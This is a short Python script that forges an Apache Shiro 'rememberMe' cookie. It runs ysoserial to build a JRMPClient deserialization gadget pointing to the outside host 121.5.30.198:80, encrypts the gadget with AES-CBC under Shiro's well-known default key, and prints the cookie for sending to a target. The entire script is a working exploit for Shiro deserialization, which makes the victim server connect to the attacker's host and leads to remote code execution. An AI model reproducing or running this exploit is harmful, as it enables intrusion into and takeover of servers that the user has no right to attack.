import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

def encode_rememberme():
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-8eb5cbfbf6-1.jar', 'JRMPClient', '121.5.30.198:80'], stdout=subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme()
    print("rememberMe={}".format(payload.decode()))
